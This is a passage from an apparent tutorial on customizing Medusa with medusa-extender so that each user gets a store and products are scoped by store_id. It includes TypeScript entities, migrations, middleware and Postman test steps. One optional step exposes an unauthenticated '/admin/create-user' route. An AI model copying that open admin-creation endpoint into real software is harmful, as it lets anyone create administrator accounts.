class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>This will create a subscriber using the <code>EventSubscriber</code> decorator from <code>typeorm</code>. Then, before a user is inserted the <code>OnMedusaEntityEvent.Before.InsertEvent</code> event from <code>medusa-extender</code> is emitted, which will trigger creating the store.</p>
<p>To register the subscriber, you need to create a middleware that registers it. Create the file <code>src/modules/user/middlewares/userSubscriber.middleware.ts</code> with the following content:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">  MEDUSA_RESOLVER_KEYS,</span><br><span class="line">  MedusaAuthenticatedRequest,</span><br><span class="line">  MedusaMiddleware,</span><br><span class="line">  Utils <span class="keyword">as</span> MedusaUtils,</span><br><span class="line">  Middleware</span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">&#x27;medusa-extender&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; NextFunction, Response &#125; <span class="keyword">from</span> <span class="string">&#x27;express&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; Connection &#125; <span class="keyword">from</span> <span class="string">&#x27;typeorm&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> UserSubscriber <span class="keyword">from</span> <span class="string">&#x27;../subscribers/user.subscriber&#x27;</span>;</span><br><span class="line"></span><br><span class="line">@Middleware(&#123; <span class="attr">requireAuth</span>: <span class="literal">false</span>, <span class="attr">routes</span>: [&#123; <span class="attr">method</span>: <span class="string">&quot;post&quot;</span>, <span class="attr">path</span>: <span class="string">&#x27;/admin/users&#x27;</span> &#125;] &#125;)</span><br><span class="line"><span class="keyword">export</span> <span class="class"><span class="keyword">class</span> <span class="title">AttachUserSubscriberMiddleware</span> <span class="title">implements</span> <span class="title">MedusaMiddleware</span> </span>&#123;</span><br><span class="line">    public <span class="keyword">async</span> consume(req: MedusaAuthenticatedRequest, <span class="attr">res</span>: Response, <span class="attr">next</span>: NextFunction): <span class="built_in">Promise</span>&lt;<span class="keyword">void</span>&gt; &#123;</span><br><span class="line">      <span class="keyword">const</span> &#123; connection &#125; = req.scope.resolve(MEDUSA_RESOLVER_KEYS.manager) <span class="keyword">as</span> &#123; <span class="attr">connection</span>: Connection &#125;;</span><br><span class="line">        MedusaUtils.attachOrReplaceEntitySubscriber(connection, UserSubscriber);</span><br><span class="line">        <span class="keyword">return</span> next();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>This will register the subscriber when a <code>POST</code> request is sent to <code>/admin/users</code>, which creates a new user.</p>
<p><strong>Create a User Router</strong></p>
<p>The last customization left is an optional one. By default, Medusa’s create user endpoint requires you to be authenticated as an admin. In a marketplace use case, you might want users to register on their own and create their own stores. If this is not the case for you, you can skip creating the following class.</p>
<p>Medusa Extender allows you to also override routes in Medusa. In this case, you’ll be adding the <code>/admin/create-user</code> route to accept non-authenticated requests.</p>
<p>Create the file <code>src/modules/user/routers/user.router.ts</code> and add the following content:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Router &#125; <span class="keyword">from</span> <span class="string">&#x27;medusa-extender&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> createUserHandler <span class="keyword">from</span> <span class="string">&#x27;@medusajs/medusa/dist/api/routes/admin/users/create-user&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> wrapHandler <span class="keyword">from</span> <span class="string">&#x27;@medusajs/medusa/dist/api/middlewares/await-middleware&#x27;</span>;</span><br><span class="line"></span><br><span class="line">@Router(&#123;</span><br><span class="line">    routes: [</span><br><span class="line">        &#123;</span><br><span class="line">            requiredAuth: <span class="literal">false</span>,</span><br><span class="line">            path: <span class="string">&#x27;/admin/create-user&#x27;</span>,</span><br><span class="line">            method: <span class="string">&#x27;post&#x27;</span>,</span><br><span class="line">            handlers: [wrapHandler(createUserHandler)],</span><br><span class="line">        &#125;,</span><br><span class="line">    ],</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">export</span> <span class="class"><span class="keyword">class</span> <span class="title">UserRouter</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>You use the <code>@Router</code> decorator from <code>medusa-extender</code> to create a router. This router will accept a <code>routes</code> array which will either be added or override existing routes in your Medusa server. In this case, you override the <code>/admin/create-user</code> route and set <code>requiredAuth</code> to false.</p>
<p>To make sure that the <code>AttachUserSubscriberMiddleware</code> also runs for this new route (so that the before insert user event handlers run for this new route), make sure to add a new entry to the <code>routes</code> array:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">@Middleware(&#123; <span class="attr">requireAuth</span>: <span class="literal">false</span>, <span class="attr">routes</span>: [&#123; <span class="attr">method</span>: <span class="string">&quot;post&quot;</span>, <span class="attr">path</span>: <span class="string">&#x27;/admin/users&#x27;</span> &#125;, &#123; <span class="attr">method</span>: <span class="string">&quot;post&quot;</span>, <span class="attr">path</span>: <span class="string">&#x27;/admin/create-user&#x27;</span> &#125;] &#125;)</span><br></pre></td></tr></table></figure>



<p><strong>Create a User Module</strong></p>
<p>You’ve added all the customizations necessary to associate a user with their own store. Now, you can create the User module using these files.</p>
<p>Create the file <code>src/modules/user/user.module.ts</code> with the following content:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; AttachUserSubscriberMiddleware &#125; <span class="keyword">from</span> <span class="string">&#x27;./middlewares/userSubscriber.middleware&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; LoggedInUserMiddleware &#125; <span class="keyword">from</span> <span class="string">&quot;./middlewares/loggedInUser.middleware&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Module &#125; <span class="keyword">from</span> <span class="string">&#x27;medusa-extender&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; User &#125; <span class="keyword">from</span> <span class="string">&#x27;./entities/user.entity&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> UserRepository <span class="keyword">from</span> <span class="string">&#x27;./repositories/user.repository&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; UserRouter &#125; <span class="keyword">from</span> <span class="string">&quot;./routers/user.router&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> UserService <span class="keyword">from</span> <span class="string">&#x27;./services/user.service&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> addStoreIdToUser1644946220401 <span class="keyword">from</span> <span class="string">&#x27;./migrations/user.migration&#x27;</span>;</span><br><span class="line"></span><br><span class="line">@Module(&#123;</span><br><span class="line">    imports: [</span><br><span class="line">        User,</span><br><span class="line">        UserService,</span><br><span class="line">        UserRepository,</span><br><span class="line">        addStoreIdToUser1644946220401,</span><br><span class="line">        UserRouter,</span><br><span class="line">        LoggedInUserMiddleware,</span><br><span class="line">        AttachUserSubscriberMiddleware</span><br><span class="line">    ]</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">export</span> <span class="class"><span class="keyword">class</span> <span class="title">UserModule</span> </span>&#123;&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>If you didn’t create the <code>UserRouter</code> in the previous step then make sure to remove it from the <code>imports</code> array.</p>
</blockquote>
<p>The last thing left is to import this Module. In <code>src/main.ts</code> import <code>UserModule</code> at the beginning of the file:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; UserModule &#125; <span class="keyword">from</span> <span class="string">&#x27;./modules/user/user.module&#x27;</span>;</span><br></pre></td></tr></table></figure>



<p>Then, add the <code>UserModule</code> in the array passed as a parameter to <code>Medusa.load</code>:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> <span class="keyword">new</span> Medusa(__dirname + <span class="string">&#x27;/../&#x27;</span>, expressInstance).load([</span><br><span class="line">        UserModule,</span><br><span class="line">        StoreModule</span><br><span class="line">]);</span><br></pre></td></tr></table></figure>



<p><strong>Test it Out</strong></p>
<p>You are now ready to test out this customization! In your terminal, run your Medusa server:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">// this is upgrade DB, also the same as scripts in package.json</span><br><span class="line">medusa seed -f data/seed.json -m</span><br><span class="line"></span><br><span class="line">// this is start medusa server</span><br><span class="line">npm start</span><br></pre></td></tr></table></figure>



<p>Or using Medusa’s CLI:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">medusa develop</span><br></pre></td></tr></table></figure>



<p>After your run your server, you need to use a tool like <a href="https://www.postman.com/">Postman</a> to easily send requests to your server.</p>
<p>If you didn’t add the <code>UserRouter</code>, you first need to log in as an admin to be able to add users. You can do that by sending a <code>POST</code> request to <code>localhost:9000/admin/auth</code>. In the body, you should include the email and password. If you’re using a fresh Medusa install you can use the following credentials:</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;email&quot;</span>: <span class="string">&quot;admin@medusa-test.com&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;password&quot;</span>: <span class="string">&quot;supersecret&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>Following this request, you can send authenticated requests to the Admin.</p>
<p>Send a <code>POST</code> request to <code>[localhost:9000/admin/users](http://localhost:9000/admin/users)</code> to create a new user. In the body, you need to pass the email and password of the new user:</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;email&quot;</span>: <span class="string">&quot;example@gmail.com&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;password&quot;</span>: <span class="string">&quot;supersecret&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>The request will return a user object with the details of the new user:</p>
<p>![Create User Result](Open source ecommerce platform for multi-vendor marketplaces/1.png)</p>
<p>Notice how there’s a <code>store_id</code> field now. If you try to create a couple of users, you’ll see that the <code>store_id</code> will be different each time.</p>
<h3 id="Customize-the-Products-Entity"><a href="#Customize-the-Products-Entity" class="headerlink" title="Customize the Products Entity"></a>Customize the Products Entity</h3><p>Similar to how you just customized the <code>User</code> entity, you need to customize the <code>Product</code> entity to also hold the <code>store_id</code> with the relationship as well. You’ll then customize the <code>ProductService</code> as well as other classes to make sure that, when a product is created, the store ID of the user creating it is attached to it. You’ll also make sure that when the list of products is fetched, only the products that belong to the current user’s store are returned.</p>
<p><strong>Create a Product Entity</strong></p>
<p>Create the file <code>src/modules/product/entities/product.entity.ts</code> with the following content:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Product <span class="keyword">as</span> MedusaProduct &#125; <span class="keyword">from</span> <span class="string">&#x27;@medusajs/medusa/dist&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Column, Entity, Index, JoinColumn, ManyToOne &#125; <span class="keyword">from</span> <span class="string">&#x27;typeorm&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Entity <span class="keyword">as</span> MedusaEntity &#125; <span class="keyword">from</span> <span class="string">&#x27;medusa-extender&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Store &#125; <span class="keyword">from</span> <span class="string">&#x27;../../store/entities/store.entity&#x27;</span>;</span><br><span class="line"></span><br><span class="line">@MedusaEntity(&#123; <span class="attr">override</span>: MedusaProduct &#125;)</span><br><span class="line">@Entity()</span><br><span class="line"><span class="keyword">export</span> <span class="class"><span class="keyword">class</span> <span class="title">Product</span> <span class="keyword">extends</span> <span class="title">MedusaProduct</span> </span>&#123;</span><br><span class="line">    @Index()</span><br><span class="line">    @Column(&#123; <span class="attr">nullable</span>: <span class="literal">false</span> &#125;)</span><br><span class="line">    store_id: string;</span><br><span class="line"></span><br><span class="line">    @ManyToOne(<span class="function">() =&gt;</span> Store, <span class="function">(<span class="params">store</span>) =&gt;</span> store.members)</span><br><span class="line">    @JoinColumn(&#123; <span class="attr">name</span>: <span class="string">&#x27;store_id&#x27;</span>, <span class="attr">referencedColumnName</span>: <span class="string">&#x27;id&#x27;</span> &#125;)</span><br><span class="line">    store: Store;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>This will override Medusa’s <code>Product</code> entity to add the <code>store_id</code> field and relation to the <code>Store</code> entity.</p>
<p>You need to also reflect this relation in the <code>Store</code> entity, so, in <code>src/modules/store/entities/store.entity.ts</code> add the following code below the relation with the <code>User</code> entity you previously added:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">@OneToMany(<span class="function">() =&gt;</span> Product, <span class="function">(<span class="params">product</span>) =&gt;</span> product.store)</span><br><span class="line">@JoinColumn(&#123; <span class="attr">name</span>: <span class="string">&#x27;id&#x27;</span>, <span class="attr">referencedColumnName</span>: <span class="string">&#x27;store_id&#x27;</span> &#125;)</span><br><span class="line">products: Product[];</span><br></pre></td></tr></table></figure>



<p>Make sure to import the <code>Product</code> entity at the beginning of the file:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Product &#125; <span class="keyword">from</span> <span class="string">&#x27;../../product/entities/product.entity&#x27;</span>;</span><br></pre></td></tr></table></figure>



<p><strong>Create a Product Migration</strong></p>
<p>Next, create the file <code>src/modules/product/migrations/product.migration.ts</code> with the following content:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; MigrationInterface, QueryRunner &#125; <span class="keyword">from</span> <span class="string">&#x27;typeorm&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; Migration &#125; <span class="keyword">from</span> <span class="string">&#x27;medusa-extender&#x27;</span>;</span><br><span class="line"></span><br><span class="line">@Migration()</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">addStoreIdToProduct1645034402086</span> <span class="title">implements</span> <span class="title">MigrationInterface</span> </span>&#123;</span><br><span class="line">    name = <span class="string">&#x27;addStoreIdToProduct1645034402086&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">async</span> up(queryRunner: QueryRunner): <span class="built_in">Promise</span>&lt;<span class="keyword">void</span>&gt; &#123;</span><br><span class="line">      <span class="keyword">const</span> query = <span class="string">`ALTER TABLE public.&quot;product&quot; ADD COLUMN IF NOT EXISTS &quot;store_id&quot; text;`</span>;</span><br><span class="line">      <span class="keyword">await</span> queryRunner.query(query);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">async</span> down(queryRunner: QueryRunner): <span class="built_in">Promise</span>&lt;<span class="keyword">void</span>&gt; &#123;</span><br><span class="line">      <span class="keyword">const</span> query = <span class="string">`ALTER TABLE public.&quot;product&quot; DROP COLUMN &quot;store_id&quot;;`</span>;</span><br><span class="line">      <span class="keyword">await</span> queryRunner.query(query);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>This will add a migration that will add the <code>store_id</code> column to the <code>product</code> table.</p>
<p><strong>Create a Product Repository</strong></p>
<p>Next, create the file <code>src/modules/product/repositories/product.repository.ts</code> with the following content:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Repository <span class="keyword">as</span> MedusaRepository, Utils &#125; <span class="keyword">from</span> <span class="string">&quot;medusa-extender&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; EntityRepository &#125; <span class="keyword">from</span> <span class="string">&quot;typeorm&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; ProductRepository <span class="keyword">as</span> MedusaProductRepository &#125; <span class="keyword">from</span> <span class="string">&quot;@medusajs/medusa/dist/repositories/product&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Product &#125; <span class="keyword">from</span> <span class="string">&#x27;../entities/product.entity&#x27;</span>;</span><br><span class="line"></span><br><span class="line">@MedusaRepository(&#123; <span class="attr">override</span>: MedusaProductRepository &#125;)</span><br><span class="line">@EntityRepository(Product)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">ProductRepository</span> <span class="keyword">extends</span> <span class="title">Utils</span>.<span class="title">repositoryMixin</span>&lt;<span class="title">Product</span>, <span class="title">MedusaProductRepository</span>&gt;(<span class="title">MedusaProductRepository</span>) </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>This will override Medusa’s <code>ProductRepository</code> to return your new <code>Product</code> entity.</p>
<p><strong>Create a Product Service</strong></p>
<p>Now, you’ll add the customization to ensure that only the products that belong to the currently logged-in user are returned when a request is sent.</p>
<p>Since you created the <code>LoggedInUserMiddleware</code> earlier, you can have access to the logged-in user from any service through the <code>container</code> object passed to the constructor of the service.</p>
<p>Create the file <code>src/modules/product/services/product.service.ts</code> with the following content:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; EntityEventType, MedusaEventHandlerParams, OnMedusaEntityEvent, Service &#125; <span class="keyword">from</span> <span class="string">&#x27;medusa-extender&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; EntityManager &#125; <span class="keyword">from</span> <span class="string">&quot;typeorm&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; ProductService <span class="keyword">as</span> MedusaProductService &#125; <span class="keyword">from</span> <span class="string">&#x27;@medusajs/medusa/dist/services&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Product &#125; <span class="keyword">from</span> <span class="string">&#x27;../entities/product.entity&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; User &#125; <span class="keyword">from</span> <span class="string">&#x27;../../user/entities/user.entity&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> UserService <span class="keyword">from</span> <span class="string">&#x27;../../user/services/user.service&#x27;</span>;</span><br><span class="line"></span><br><span class="line">type ConstructorParams = &#123;</span><br><span class="line">    manager: any;</span><br><span class="line">    loggedInUser: User;</span><br><span class="line">    productRepository: any;</span><br><span class="line">    productVariantRepository: any;</span><br><span class="line">    productOptionRepository: any;</span><br><span class="line">    eventBusService: any;</span><br><span class="line">    productVariantService: any;</span><br><span class="line">    productCollectionService: any;</span><br><span class="line">    productTypeRepository: any;</span><br><span class="line">    productTagRepository: any;</span><br><span class="line">    imageRepository: any;</span><br><span class="line">    searchService: any;</span><br><span class="line">    userService: UserService;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@Service(&#123; <span class="attr">scope</span>: <span class="string">&#x27;SCOPED&#x27;</span>, <span class="attr">override</span>: MedusaProductService &#125;)</span><br><span class="line"><span class="keyword">export</span> <span class="class"><span class="keyword">class</span> <span class="title">ProductService</span> <span class="keyword">extends</span> <span class="title">MedusaProductService</span> </span>&#123;</span><br><span class="line">    readonly #manager: EntityManager;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params">private readonly container: ConstructorParams</span>)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(container);</span><br><span class="line">        <span class="built_in">this</span>.#manager = container.manager;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    prepareListQuery_(selector: object, <span class="attr">config</span>: object): object &#123;</span><br><span class="line">        <span class="keyword">const</span> loggedInUser = <span class="built_in">this</span>.container.loggedInUser</span><br><span class="line">        <span class="keyword">if</span> (loggedInUser) &#123;</span><br><span class="line">            selector[<span class="string">&#x27;store_id&#x27;</span>] = loggedInUser.store_id</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.prepareListQuery_(selector, config);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>This will override the <code>prepareListQuery</code> method in Medusa’s <code>ProductService</code>, which this new class extends, to get the logged-in user. Then, if the user is retrieved successfully the key <code>store_id</code> is added to the <code>selector</code> object to filter the products by the user’s <code>store_id</code>.</p>
<p><strong>Create a Product Module</strong></p>
<p>That’s all the customization you’ll do for now. You just need to import all these files into a Product module.</p>
<p>Create <code>src/modules/product/product.module.ts</code> with the following content:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Module &#125; <span class="keyword">from</span> <span class="string">&#x27;medusa-extender&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Product &#125; <span class="keyword">from</span> <span class="string">&#x27;./entities/product.entity&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> ProductRepository <span class="keyword">from</span> <span class="string">&#x27;./repositories/product.repository&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; ProductService &#125; <span class="keyword">from</span> <span class="string">&#x27;./services/product.service&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> addStoreIdToProduct1645034402086 <span class="keyword">from</span> <span class="string">&#x27;./migrations/product.migration&#x27;</span>;</span><br><span class="line"></span><br><span class="line">@Module(&#123;</span><br><span class="line">    imports: [</span><br><span class="line">      Product,</span><br><span class="line">      ProductRepository,</span><br><span class="line">      ProductService,</span><br><span class="line">      addStoreIdToProduct1645034402086,</span><br><span class="line">    ]</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">export</span> <span class="class"><span class="keyword">class</span> <span class="title">ProductModule</span> </span>&#123;&#125;</span><br></pre></td></tr></table></figure>



<p>Finally, import the <code>ProductModule</code> at the beginning of <code>src/main.ts</code>:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; ProductModule &#125; <span class="keyword">from</span> <span class="string">&#x27;./modules/product/product.module&#x27;</span>;</span><br></pre></td></tr></table></figure>



<p>And add the <code>ProductModule</code> to the array passed to <code>load</code> along with <code>UserModule</code>:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> <span class="keyword">new</span> Medusa(__dirname + <span class="string">&#x27;/../&#x27;</span>, expressInstance).load([</span><br><span class="line">    UserModule,</span><br><span class="line">    ProductModule,</span><br><span class="line">    StoreModule</span><br><span class="line">]);</span><br></pre></td></tr></table></figure>



<p><strong>Test it Out</strong></p>
<p>You can go ahead and test it out now. Run the server if it isn’t running already and log in with the user you created earlier by sending the credentials to <code>localhost:9000/admin/auth</code>.</p>
<p>After that, send a <code>GET</code> request to <code>localhost:9000/admin/products</code>. You’ll receive an empty array of products as the current user does not have any products yet.</p>
<p>![Result of Get Products](Open source ecommerce platform for multi-vendor marketplaces/2.png)</p>
<p>You’ll now add the necessary customization to attach a store ID to a newly created product.</p>
<p>To listen to the product created event, create the file <code>src/modules/product/subscribers/product.subscriber.ts</code> with the following content:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Connection, EntitySubscriberInterface, EventSubscriber, InsertEvent &#125; <span class="keyword">from</span> <span class="string">&#x27;typeorm&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; OnMedusaEntityEvent, Utils, eventEmitter &#125; <span class="keyword">from</span> <span class="string">&#x27;medusa-extender&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; Product &#125; <span class="keyword">from</span> <span class="string">&#x27;../entities/product.entity&#x27;</span>;</span><br><span class="line"></span><br><span class="line">@EventSubscriber()</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">ProductSubscriber</span> <span class="title">implements</span> <span class="title">EntitySubscriberInterface</span>&lt;<span class="title">Product</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> attachTo(connection: Connection): <span class="keyword">void</span> &#123;</span><br><span class="line">        Utils.attachOrReplaceEntitySubscriber(connection, ProductSubscriber);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public listenTo(): <span class="keyword">typeof</span> Product &#123;</span><br><span class="line">        <span class="keyword">return</span> Product;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">async</span> beforeInsert(event: InsertEvent&lt;Product&gt;): <span class="built_in">Promise</span>&lt;<span class="keyword">void</span>&gt; &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">await</span> eventEmitter.emitAsync(OnMedusaEntityEvent.Before.InsertEvent(Product), &#123;</span><br><span class="line">            event,</span><br><span class="line">            transactionalEntityManager: event.manager,</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>Then, you need to register this Subscriber using Middleware. Create the file <code>src/modules/product/middlewares/product.middleware.ts</code> with the following content:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">  MEDUSA_RESOLVER_KEYS,</span><br><span class="line">  MedusaAuthenticatedRequest,</span><br><span class="line">  MedusaMiddleware,</span><br><span class="line">  Utils <span class="keyword">as</span> MedusaUtils,</span><br><span class="line">  Middleware</span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">&#x27;medusa-extender&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; NextFunction, Request, Response &#125; <span class="keyword">from</span> <span class="string">&#x27;express&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; Connection &#125; <span class="keyword">from</span> <span class="string">&#x27;typeorm&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> ProductSubscriber <span class="keyword">from</span> <span class="string">&#x27;../subscribers/product.subscriber&#x27;</span>;</span><br><span class="line"></span><br><span class="line">@Middleware(&#123; <span class="attr">requireAuth</span>: <span class="literal">true</span>, <span class="attr">routes</span>: [&#123; <span class="attr">method</span>: <span class="string">&#x27;post&#x27;</span>, <span class="attr">path</span>: <span class="string">&#x27;/admin/products&#x27;</span> &#125;] &#125;)</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">AttachProductSubscribersMiddleware</span> <span class="title">implements</span> <span class="title">MedusaMiddleware</span> </span>&#123;</span><br><span class="line">    public consume(req: MedusaAuthenticatedRequest | Request, <span class="attr">res</span>: Response, <span class="attr">next</span>: NextFunction): <span class="keyword">void</span> | <span class="built_in">Promise</span>&lt;<span class="keyword">void</span>&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123; connection &#125; = req.scope.resolve(MEDUSA_RESOLVER_KEYS.manager) <span class="keyword">as</span> &#123; <span class="attr">connection</span>: Connection &#125;;</span><br><span class="line">        MedusaUtils.attachOrReplaceEntitySubscriber(connection, ProductSubscriber);</span><br><span class="line">        <span class="keyword">return</span> next();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>This will register the subscriber when a <code>POST</code> request is sent to <code>/admin/products</code>, which creates a new product.</p>
<p><strong>Add Event Listener in Product Service</strong></p>
<p>Next, in <code>src/modules/product/services/product.service.ts</code> add the following inside the class:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">@OnMedusaEntityEvent.Before.Insert(Product, &#123; <span class="attr">async</span>: <span class="literal">true</span> &#125;)</span><br><span class="line">public <span class="keyword">async</span> attachStoreToProduct(</span><br><span class="line">    params: MedusaEventHandlerParams&lt;Product, <span class="string">&#x27;Insert&#x27;</span>&gt;</span><br><span class="line">): <span class="built_in">Promise</span>&lt;EntityEventType&lt;Product, <span class="string">&#x27;Insert&#x27;</span>&gt;&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; event &#125; = params;</span><br><span class="line">    <span class="keyword">const</span> loggedInUser = <span class="built_in">this</span>.container.loggedInUser;</span><br><span class="line">    event.entity.store_id = loggedInUser.store_id;</span><br><span class="line">    <span class="keyword">return</span> event;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>This will listen to the Insert event using the <code>@OnMedusaEntityEvent</code> decorator from <code>medusa-extender</code>. It will then use the logged-in user and attach the user’s <code>store_id</code> to the newly created product.</p>
<p><strong>Add Middleware to Product Module</strong></p>
<p>Finally, make sure to import the new middleware at the beginning of <code>src/modules/product/product.module.ts</code>:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> AttachProductSubscribersMiddleware <span class="keyword">from</span> <span class="string">&#x27;./middlewares/product.middleware&#x27;</span>;</span><br></pre></td></tr></table></figure>



<p>Then, add it in the <code>imports</code> array passed to <code>@Module</code>:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">imports: [</span><br><span class="line">  Product,</span><br><span class="line">  ProductRepository,</span><br><span class="line">  ProductService,</span><br><span class="line">  addStoreIdToProduct1645034402086,</span><br><span class="line">  AttachProductSubscribersMiddleware</span><br><span class="line">]</span><br></pre></td></tr></table></figure>



<p>You’re ready to add products into a store now! Run the server if it’s not running and make sure you’re logged in with the user you created earlier. Then, send a <code>POST</code> request to <code>[localhost:9000/admin/products](http://localhost:9000/admin/products)</code> with the following body:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;title&quot;</span>: <span class="string">&quot;my product&quot;</span>,</span><br><span class="line">    <span class="string">&quot;options&quot;</span>: []</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>This is the minimum structure of a product. You can rename the title to anything you want.</p>
<p>After you send the request, you should receive a Product object where you can see the <code>store_id</code> is set to the same <code>store_id</code> of the user you’re logged in with.</p>
<p>![Add Product Request Result](Open source ecommerce platform for multi-vendor marketplaces/3.png)</p>
<p>Now, try sending a <code>GET</code> request to <code>[localhost:9000/admin/products](http://localhost:9000/admin/products)</code> as you did earlier. Instead of an empty array, you’ll see the product you just added.</p>
